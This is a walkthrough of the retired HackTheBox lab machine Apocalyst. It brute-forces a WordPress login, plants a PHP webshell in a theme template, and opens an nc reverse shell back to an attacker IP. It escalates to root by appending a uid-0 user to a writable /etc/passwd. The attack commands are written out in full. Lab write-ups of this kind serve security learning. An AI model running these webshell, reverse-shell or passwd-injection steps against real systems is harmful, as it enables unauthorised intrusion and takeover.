---
title: HTB: Apocalyst
url: https://0xdf.gitlab.io/2021/02/09/htb-apocalyst.html
date: 2021-02-09T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-apocalyst, ctf, nmap, wordpress, wpscan, gobuster, wfuzz, steghide, passwd
---

![Apocalyst](https://0xdfimages.gitlab.io/img/apocalyst-cover.png)

Apocalyst wasn’t my favorite box. It is all about building a wordlist to find a specific image file on the site, and then extracting another list from that image using StegHide. That list contains the WordPress user’s password, giving access to the admin panel and thus execution. To root, I’ll find a writable passwd file and add in a root user.

## Box Info

| Name | [Apocalyst](https://hackthebox.com/machines/apocalyst)  [Apocalyst](https://hackthebox.com/machines/apocalyst) [Play on HackTheBox](https://hackthebox.com/machines/apocalyst) |
| --- | --- |
| Release Date | 18 Aug 2017 |
| Retire Date | 25 Nov 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Apocalyst |
| Radar Graph | Radar chart for Apocalyst |
| First Blood User | 01:13:22[B3h0ld3r B3h0ld3r](https://app.hackthebox.com/users/4788) |
| First Blood Root | 04:39:54[clandestine clandestine](https://app.hackthebox.com/users/5593) |
| Creator | [Dosk3n Dosk3n](https://app.hackthebox.com/users/4987) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.46
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:48 EST
Nmap scan report for 10.10.10.46
Host is up (0.013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.07 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.46
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:49 EST
Nmap scan report for 10.10.10.46
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apocalypse Preparation Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 16.04 Xenial.

### Website - TCP 80

#### Configure Domain

Just from the `nmap` scan it’s clear the site is running WordPress. WordPress is notorious for needing a domain name to load all the elements, so it’s no surprise when visiting the site by IP address looks version broken. Looking at the page source, there are many references to `apocalyst.htb`, so I’ll add that to my `/etc/hosts` file, and on reloading, the page looks right.

#### Site

The site is an Apocalypse Preparation Blog:

[![image-20210204175955091](https://0xdfimages.gitlab.io/img/image-20210204175955091.png)](https://0xdfimages.gitlab.io/img/image-20210204175955091.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210204175955091.png)

Looking at the posts, there are three all by user falaraki.

#### wpscan

Given the site is WordPress, I’ll run [wpscan](https://github.com/wpscanteam/wpscan):

```

oxdf@parrot$ wpscan --url http://apocalyst.htb/ -e ap,t,tt,u --api-token $WPSCAN_API
...[snip]...

```

It shows a ton of vulnerabilities (which isn’t surprising for a box that’s three years old), but all are XSS or DOS or other things that don’t seem useful to me. It identified the same user that I had, falaraki.

No vulnerable plugins, and I couldn’t find any unauthenticated exploits against WordPress Core after this version (4.8).

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP with the command `gobuster dir -u http://apocalyst.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php`. It seems *tons* of things in the list return status 301.

Looking at one example, I’ll visit `http://apocalyst.htb/book`. It returns a 301 redirect to `/book/`. This is not uncommon to see. The resulting page just has an image:

![image-20210205140005295](https://0xdfimages.gitlab.io/img/image-20210205140005295.png)

The source is simple:

```

<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">

  <title>End of the world</title>
</head>

<body>
  <img src="image.jpg">
</body>
</html>

```

`gobuster` has an option, `-f` to add a `/` to the end of the urls it generates, but I’ll still have an issue of everything returning the same page. I’ll switch to `wfuzz` to filter out responses of the same length. I’ll start with no filter and Ctrl-c it once it gets started:

```

oxdf@parrot$ wfuzz -u http://apocalyst.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-smal
l.txt                                                                  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ/
Total requests: 87664
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000048:   404        9 L      32 W       280 Ch      "01"
000000050:   404        9 L      32 W       280 Ch      "06"
000000047:   404        9 L      32 W       283 Ch      "links"
000000015:   404        9 L      32 W       283 Ch      "index"
000000031:   404        9 L      32 W       282 Ch      "logo"
000000046:   404        9 L      32 W       280 Ch      "09"
000000049:   404        9 L      32 W       280 Ch      "08"
000000043:   404        9 L      32 W       285 Ch      "sitemap"
...[snip]...
000000341:   200        13 L     17 W       157 Ch      "text"
000000340:   200        13 L     17 W       157 Ch      "post"
000000396:   200        13 L     17 W       157 Ch      "art"
000000379:   200        13 L     17 W       157 Ch      "book"
000000444:   200        13 L     17 W       157 Ch      "icon"
000000431:   200        13 L     17 W       157 Ch      "start"
000000480:   200        13 L     17 W       157 Ch      "personal"
000000466:   200        13 L     17 W       157 Ch      "pictures"
000000525:   200        13 L     17 W       157 Ch      "Search"
000000565:   200        13 L     17 W       157 Ch      "information"
000000641:   200        13 L     17 W       157 Ch      "reference"
000000669:   200        13 L     17 W       157 Ch      "entry"  
...[snip]...

```

It looks like hiding the 404 responses (`--hc 404`) and the 157 character responses (`--hh 157`) should do it. This doesn’t find much of interest:

```

oxdf@parrot$ wfuzz -u http://apocalyst.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hh 157 --hc 404 -t 40
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ/
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                      
=====================================================================

000000083:   403        11 L     32 W       294 Ch      "icons"
000000014:   301        0 L      0 W        0 Ch        "http://apocalyst.htb//"
000000008:   200        397 L    4704 W     61496 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                 
000000002:   200        397 L    4704 W     61496 Ch    "#"
000000013:   200        397 L    4704 W     61496 Ch    "#"
000000012:   200        397 L    4704 W     61496 Ch    "# on atleast 3 different hosts"
000000009:   200        397 L    4704 W     61496 Ch    "# Suite 300, San Francisco, California, 94105, USA."                        
000000005:   200        397 L    4704 W     61496 Ch    "# This work is licensed under the Creative Commons"                         
000000011:   200        397 L    4704 W     61496 Ch    "# Priority ordered case sensative list, where entries were found"           
000000010:   200        397 L    4704 W     61496 Ch    "#"
000000006:   200        397 L    4704 W     61496 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"              
000000004:   200        397 L    4704 W     61496 Ch    "#"
000000241:   200        0 L      0 W        0 Ch        "wp-content"
000000001:   200        397 L    4704 W     61496 Ch    "# directory-list-2.3-small.txt"
000000003:   200        397 L    4704 W     61496 Ch    "# Copyright 2007 James Fisher"
000000785:   200        200 L    2015 W     40841 Ch    "wp-includes"
000000007:   200        397 L    4704 W     61496 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"            
000007462:   302        0 L      0 W        0 Ch        "wp-admin"
000045647:   301        0 L      0 W        0 Ch        "http://apocalyst.htb//"

Total time: 0
Processed Requests: 87664
Filtered Requests: 87645
Requests/sec.: 0

```

### WP Admin Access

This part is really silly, and I don’t think would meet HTB standards for release today. But as it’s an older machine, CTF-like stuff was much more common.

#### Generate Custom Wordlist

I’ll build a wordlist using the text on the site. [Cewl](https://github.com/digininja/CeWL) is a good tool for this (I’ve [shown it a few times before](/tags.html#cewl)). To generate a wordlist, I’ll run `cewl apocalyst.htb -w apocalyst.htb.wordlist --with-numbers`.

On re-running the `wfuzz` above with this wordlist, it returns one result:

```

oxdf@parrot$ wfuzz -u http://apocalyst.htb/FUZZ/ -w apocalyst.htb.wordlist --hh 157 --hc 404 -t 40
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://apocalyst.htb/FUZZ/
Total requests: 545

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000464:   200        14 L     20 W       175 Ch      "Rightiousness"

Total time: 0
Processed Requests: 545
Filtered Requests: 544
Requests/sec.: 0

```

#### Image

Visiting `http://apocalyst.htb/Rightiousness/`, it looks like the same image, but the source is slightly different, as there’s an HTML comment `<!-- needle -->` :

```

<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">

  <title>End of the world</title>
</head>

<body>
  <img src="image.jpg">
  <!-- needle -->
</body>
</html>

```

The image looks the same, but it’s actually a slightly different size, and now there’s a comment hinting that I should look at it:

![image-20210205143104818](https://0xdfimages.gitlab.io/img/image-20210205143104818.png)

I’ll save it and run `steghide` on it, giving an empty password, and it extracts a file that looks like another word list:

```

oxdf@parrot$ steghide extract -sf image.jpeg 
Enter passphrase: 
wrote extracted data to "list
oxdf@parrot$ cat list.txt 
World
song
from
disambiguation
Wikipedia
album
page
this
world
Edit
...[snip]...

```

#### Bruteforce Password

With this wordlist, I can check to see if any are the password for the user I identified, falaraki. I could use `hydra`, but `wpscan` has a brute forcer made to work on WP, so I’ll give that a run:

```

oxdf@parrot$ wpscan --url http://apocalyst.htb --passwords list.txt --usernames falaraki
...[snip]...
[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation
...[snip]...

```

Visiting `/wp-admin`, those creds work and lead to the admin dashboard:

![image-20210205143308693](https://0xdfimages.gitlab.io/img/image-20210205143308693.png)

## Shell as www-data

### Webshell

With admin access to WP, there are many ways to get execution. The first I usually try is to edit a theme page, by going to Appearance –> Editor:

![image-20210205143444716](https://0xdfimages.gitlab.io/img/image-20210205143444716.png)

The 404 template is a good place to start. I’ll select that on right right side, and add some code at the top to test:

```

<?php
if (isset($_REQUEST['0xdf'])){ echo '0xdf'; }
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page

```

Now I’ll find a post that doesn’t exist. The top post on the main page leads to `http://apocalyst.htb/?p=9`. Changing that 9 to 8 leads to the 404 page:

![image-20210205143953571](https://0xdfimages.gitlab.io/img/image-20210205143953571.png)

Now I’ll add the parameter `0xdf`, visiting `http://apocalyst.htb/?p=8&0xdf=1`, and “0xdf” is printed right at the top:

```

oxdf@parrot$ curl -s 'http://apocalyst.htb/?p=8&0xdf=1' | head
0xdf<!DOCTYPE html>
<html lang="en-GB" class="no-js no-svg">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">

<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>Page not found &#8211; Apocalypse Preparation Blog</title>
<meta name='robots' content='noindex,follow' />

```

This shows I can write PHP that will be executed. I’ll change the code to a webshell, `<?php
if (isset($_REQUEST['0xdf'])){ system($_REQUEST['0xdf']); echo "\n";}` , and now it executes commands:

```

oxdf@parrot$ curl -s 'http://apocalyst.htb/?p=8&0xdf=id' | head -3
uid=33(www-data) gid=33(www-data) groups=33(www-data)

<!DOCTYPE html>

```

### Shell

I wasn’t able to get my go-to Bash reverse shell to work, but the FIFO `nc` shell worked fine:

```

oxdf@parrot$ curl -s 'http://apocalyst.htb/?p=8' --data-urlencode '0xdf=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f'

```

With the listener already running, it gets the shell:

```

oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.46] 35858
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

`python` isn’t on this host, but `python3` is, so I can upgrade my shell:

```

$ python -c 'import pty;pty.spawn("bash")'
/bin/sh: 2: python: not found
$ python3 -c 'import pty;pty.spawn("bash")'
www-data@apocalyst:/var/www/html/apocalyst.htb$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
www-data@apocalyst:/var/www/html/apocalyst.htb$

```

This user can access `/home/falaraki` and read `user.txt`:

```

www-data@apocalyst:/home/falaraki$ cat user.txt
9182d4d0**********************

```

## Shell as root

### Enumeration

Nothing else obvious jumped out by poking around in common directories, so I uploaded [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) by starting a Python webserver (`python3 -m http.server`) in the directory and then using `wget` from Apocalyst to download it into `/dev/shm`:

```

www-data@apocalyst:/dev/shm$ wget 10.10.14.14:8000/linpeas.sh
--2021-02-05 19:56:12--  http://10.10.14.14:8000/linpeas.sh
Connecting to 10.10.14.14:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 320037 (313K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 312.54K  --.-KB/s    in 0.08s   

2021-02-05 19:56:13 (4.03 MB/s) - 'linpeas.sh' saved [320037/320037]

```

I’ll set it executable, and run it:

```

www-data@apocalyst:/dev/shm$ chmod +x linpeas.sh 
www-data@apocalyst:/dev/shm$ ./linpeas.sh
...[snip]...
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ /etc/passwd is writable
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read opasswd file? ............. No
[+] Can I write in network-scripts? ...... No
[+] Can I read root folder? .............. No
...[snip]...

```

It won’t come through in this copy paste, but that `/etc/passwd is writable` shows up in yellow background with red text! The script is correct:

```

www-data@apocalyst:/etc$ ls -l passwd
-rw-rw-rw- 1 root root 1637 Jul 26  2017 passwd

```

That’s exploitable.

### Create Root User

I’ll generate a password hash of the format that would show up in a `passwd` file:

```

www-data@apocalyst:/etc$ openssl passwd -1 0xdf    
$1$ZdNgkXMh$IACjDuFtgYshwpcoQhQjB/

```

The format of a line in the `passwd` file is:

```

[user]:[hash including $[type]$[salt]$[hash]]:[userid]:[groupid]:[comment]:[homedir]:[shell]

```

So I’ll use that to generate a line for a new user with user and group id 0 (root):

```

0xdf:$1$ZdNgkXMh$IACjDuFtgYshwpcoQhQjB/:0:0:0xdf:/root:/bin/bash

```

I’ll add that line to the end of the `passwd` file:

```

www-data@apocalyst:/etc$ echo 'oxdf:$1$ZdNgkXMh$IACjDuFtgYshwpcoQhQjB/:0:0:0xdf:/root:/bin/bash' >> passwd

```

Now `su oxdf` will prompt for that user’s password, which I just set to “0xdf”:

```

www-data@apocalyst:/etc$ su oxdf
Password: 
root@apocalyst:/etc#

```

Because the oxdf user has userid 0, it is root.

I can grab the flag:

```

root@apocalyst:~# cat root.txt
1cb9d00f************************

```